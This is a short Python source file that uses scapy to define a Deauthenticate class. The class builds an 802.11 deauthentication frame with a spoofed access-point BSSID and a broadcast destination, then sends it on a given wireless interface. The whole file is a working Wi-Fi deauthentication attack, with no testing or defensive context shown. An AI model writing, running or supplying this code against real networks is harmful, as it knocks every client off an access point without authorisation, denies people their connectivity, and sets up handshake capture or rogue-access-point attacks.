import scapy.all


class Deauthenticate:
    def __init__(self, iface, bssid):
        scapy.all.conf.verbose = False
        self.iface = iface

        self.pkt = (
            scapy.all.RadioTap()
            / scapy.all.Dot11(
                type=0,
                subtype=12,
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=bssid,
                addr3=bssid,
            )
            / scapy.all.Dot11Deauth(reason=7)
        )

    def sendp(self):
        scapy.all.sendp(
            self.pkt, iface=self.iface, inter=0.1, count=1, verbose=0
        )
